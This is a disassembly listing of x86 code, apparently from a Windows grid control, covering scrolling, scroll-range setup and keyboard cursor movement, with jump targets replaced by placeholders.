mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x24c ]
jl r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
test [ ebx + 0x248 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xdc ]
test al al
je r-xdata
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x238 ]
mov [ ebx + 0x228 ] eax
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_46e030
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_46d778
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46d778
lea edx [ ebx + 0x228 ]
mov eax ebx
call sub_46d12c
sub_46dfc4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x258 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebx + 0x258 ]
mov [ esp ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x258 ] esi
mov [ ebx + 0x25c ] edi
mov edx esp
mov eax ebx
call sub_46e300
cmp edi [ ebx + 0x25c ]
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_46e030
push ebx
push esi
push edi
add esp 0xffffff90
mov ebx edx
mov edi eax
mov eax edi
call sub_449088
test al al
je r-xdata
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax edi
call sub_46d628
push 0x1
lea edx [ esp + 0x64 ]
mov eax edi
call sub_46f8b4
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x14 ]
mov eax edi
call sub_46d628
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
mov eax esp
call sub_46a4d0
mov esi 0x4
lea ebx [ esp + 0x20 ]
push 0x0
push ebx
mov eax edi
call sub_448d84
push eax
call InvalidateRect
add ebx 0x10
dec esi
jne r-xdata
sub_46e0a8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x2
cmp [ ebx + 0x28c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
or [ ebp - 0x8 ] 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov eax [ edi + 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_412f04
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_448d84
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_412f04
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_448d84
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
mov eax [ edi + 0x4 ]
call sub_412f04
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_448d84
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_412f04
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_448d84
push eax
call ScrollWindowEx
jmp r-xdata
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_441f54
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_441f54
sub eax [ edi + 0xc ]
xor edx edx
pop ecx
call sub_412f04
neg [ ebp - 0x4 ]
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_412f04
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_46f8b4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_46d7a4
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_448d84
push eax
call ScrollWindowEx
jmp r-xdata
sub_46e254
push ebx
push esi
push edi
add esp 0xffffffa0
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_46c800
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_46e0a8
add esp 0x60
pop edi
pop esi
pop ebx
retn
sub_46e27c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
inc edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi ] ecx
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x9 ] 0x1
neg [ esi ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
call sub_46d79c
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ esi ] eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx + 0x4 ]
cmp eax [ esi ]
jge r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46e300
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46e400
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_46c800
push ebp
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x258 ]
mov edx [ ebx ]
lea eax [ ebp - 0x70 ]
call sub_46e27c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_403540
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x25c ]
mov edx [ ebx + 0x4 ]
lea eax [ ebp - 0x40 ]
call sub_46e27c
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46e0a8
sub_46e380
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
movzx esi di
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448d84
push eax
call GetScrollPos
cmp ebx eax
je r-xdata
test di di
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448d84
push eax
call SetScrollPos
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x21c ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub eax ebx
mov ebx eax
mov eax 0x7f
sub eax ebx
mov ebx eax
jmp r-xdata
sub_46e400
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
call sub_449088
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ esi ]
call sub_46c800
mov eax [ esi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x78 ]
lea edx [ ebp - 0x14 ]
mov eax [ esi ]
call sub_46ca38
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x10 ] eax
mov eax [ esi ]
mov al [ eax + 0x254 ]
sub al 0x1
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x238 ]
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x258 ]
sub eax ebx
push eax
call MulDiv
mov edx eax
xor eax eax
call sub_46e380
pop ecx
mov edx [ ebp - 0x5c ]
mov eax [ esi ]
call sub_46f874
mov [ ebp - 0x8 ] eax
mov eax [ esi ]
call sub_441f54
sub eax [ ebp - 0x74 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
mov eax [ eax + 0x288 ]
test eax eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x23c ]
mov eax [ ebp - 0x10 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x25c ]
sub eax ebx
push eax
call MulDiv
mov edx eax
mov ax 0x1
call sub_46e380
pop ecx
push ebp
mov edx eax
xor eax eax
call sub_46e380
pop ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
sub edx eax
cmp edx [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
push eax
push 0x1
mov ecx 0x4
xor edx edx
mov eax [ esi ]
call sub_46dbc8
jmp r-xdata
sub_46e54c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x1
sub_46e570
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
movzx eax bx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_448d84
push eax
call GetScrollRange
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
setne al
test bx bx
jne r-xdata
cmp bx 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x1
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x2
jne r-xdata
sub_46e5e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x5c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46c884
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46ca38
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x70 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x6c ] edx
pop ecx
pop ecx
pop ebp
retn
sub_46e658
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
call sub_46e5e0
pop ecx
mov eax [ ebx ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
push 0xffffffff
push 0x0
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_448d84
push eax
call SetScrollRange
push 0xffffffff
push 0x7f
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_448d84
push eax
call SetScrollRange
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp + 0x10 ]
push eax
call sub_46e54c
pop ecx
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ edi ]
cmp eax [ ebx ]
jle r-xdata
sub_46e6d4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
sub al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x78 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff90
call sub_46e658
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_46f874
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_441f54
sub ebx eax
test ebx ebx
jge r-xdata
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_448d84
push eax
call SetScrollRange
jmp r-xdata
xor ebx ebx
sub_46e768
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
add al 0xfe
sub al 0x2
jae r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x25c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x74 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff94
call sub_46e658
pop ecx
sub_46e7ac
push ebp
mov ebp esp
add esp 0xffffff84
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_449088
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_441f54
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
call sub_441f98
mov [ ebp - 0x2c ] eax
push ebp
xor eax eax
call sub_46e570
pop ecx
test al al
je r-xdata
push ebp
mov ax 0x1
call sub_46e570
pop ecx
test al al
je r-xdata
push 0x3
call GetSystemMetrics
add [ ebp - 0x2c ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x254 ]
mov [ ebp - 0x79 ] al
mov eax [ ebp - 0x8 ]
mov [ eax + 0x254 ] 0x0
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_46e8ba
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_46e6d4
pop ecx
mov eax [ ebp - 0x8 ]
call sub_441f98
mov [ ebp - 0x2c ] eax
push ebp
call sub_46e768
pop ecx
mov eax [ ebp - 0x8 ]
call sub_441f54
cmp eax [ ebp - 0x5c ]
je r-xdata
push 0x2
call GetSystemMetrics
add [ ebp - 0x5c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e8c1
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x79 ]
mov [ eax + 0x254 ] dl
retn
mov eax [ ebp - 0x8 ]
call sub_441f54
mov [ ebp - 0x5c ] eax
push ebp
call sub_46e6d4
pop ecx
sub_46e8c1
mov eax [ ebp - 0x8 ]
call sub_46e400
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
cmp eax [ ebp - 0x78 ]
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x8 ]
call sub_46e300
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x25c ]
cmp eax [ ebp - 0x74 ]
je r-xdata
mov esp ebp
pop ebp
retn
sub_46e904
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445c10
or [ esi + 0x4 ] 0x10000
mov al [ ebx + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ ebx + 0x254 ]
sub al 0x1
je r-xdata
or [ esi + 0x4 ] 0x200000
or [ esi + 0x4 ] 0x100000
sub al 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x24 ] 0x8
cmp [ ebx + 0x218 ] 0x1
jne r-xdata
or [ esi + 0x4 ] 0x800000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
jmp r-xdata
sub_46e980
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
call sub_46c800
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x258 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x68 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x68 ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x25c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6c ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x68 ] 0x1
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x6c ] 0x1
sub_46e9ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi [ eax ]
cmp ebx edi
jge r-xdata
cmp edx edi
jle r-xdata
mov [ eax ] ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp esi edx
jge r-xdata
mov [ eax ] edx
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov [ eax + 0x4 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_46ea2c
push ebp
mov ebp esp
add esp 0xffffff6c
push ebx
push esi
push edi
mov [ ebp - 0x6d ] cl
mov ebx edx
mov [ ebp - 0x64 ] eax
lea edi [ ebp - 0x64 ]
mov edx ebx
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
call sub_447bb0
mov [ ebp - 0x89 ] 0x0
mov dx [ ebx ]
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
mov si 0xffb1
call sub_403540
test al al
jne r-xdata
mov eax [ edi ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov [ ebx ] 0x0
or esi 0xffffffff
mov esi 0x1
jmp r-xdata
movzx eax [ ebx ]
cmp eax 0x25
jg r-xdata
movzx eax [ ebx ]
add eax 0xffffffdf
cmp eax 0x7
ja r-xdata
mov eax [ edi ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x80 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x7c ] edx
mov eax [ edi ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
push ebp
call sub_46e980
pop ecx
test [ ebp - 0x6d ] 0x4
je r-xdata
sub eax 0x26
je r-xdata
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x88 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x60 ]
lea edx [ ebp - 0x88 ]
mov eax [ edi ]
call sub_46ca38
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x88 ]
push eax
mov eax [ ebp - 0x84 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x78 ]
call sub_46e9ec
mov edx [ edi ]
mov edx [ edx + 0x258 ]
mov eax [ ebp - 0x78 ]
cmp edx eax
jne r-xdata
jmp [ eax * 4 + jump_table_46ead8 ]
dec [ ebp - 0x7c ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
cmp eax 0x22
jg r-xdata
mov ecx [ ebp - 0x74 ]
mov edx eax
mov eax [ edi ]
call sub_46dfc4
mov edx [ edi ]
mov edx [ edx + 0x25c ]
cmp edx [ ebp - 0x74 ]
je r-xdata
dec [ ebp - 0x74 ]
jmp r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x25c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_403540
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_403540
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
sub [ ebp - 0x80 ] esi
jmp r-xdata
sub [ ebp - 0x7c ] esi
jmp r-xdata
sub eax 0x23
je r-xdata
je r-xdata
test [ ebp - 0x6d ] 0x1
setne dl
xor dl 0x1
push edx
mov ecx [ ebp - 0x7c ]
mov edx eax
mov eax [ edi ]
call sub_46d4c4
mov edx [ edi ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x7c ]
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
push eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x80 ]
call sub_46e9ec
mov edx [ edi ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x80 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x68 ]
imul esi
sub [ ebp - 0x80 ] eax
sub [ ebp - 0x78 ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
imul esi
add [ ebp - 0x80 ] eax
add [ ebp - 0x78 ] eax
jmp r-xdata
add [ ebp - 0x80 ] esi
jmp r-xdata
add [ ebp - 0x7c ] esi
jmp r-xdata
inc [ ebp - 0x7c ]
jmp r-xdata
sub eax 0x49
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
add [ ebp - 0x74 ] eax
jmp r-xdata
sub eax 0x9
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x89 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ edi ]
call sub_46fbfc
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
jmp r-xdata
test [ ebp - 0x6d ] 0x2
jne r-xdata
sub eax 0x18
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
test [ ebp - 0x6d ] 0x1
je r-xdata
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x74 ] eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x21c ]
cmp eax [ ebp - 0x80 ]
jg r-xdata
dec [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x80 ]
jle r-xdata
mov edx [ ebp - 0x80 ]
mov eax [ edi ]
call sub_46f8d0
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
inc [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0x7c ]
jg r-xdata
mov al [ r-xdata ]
mov [ ebp - 0x6d ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
dec [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0x7c ]
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
sub_46ee99
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447d68
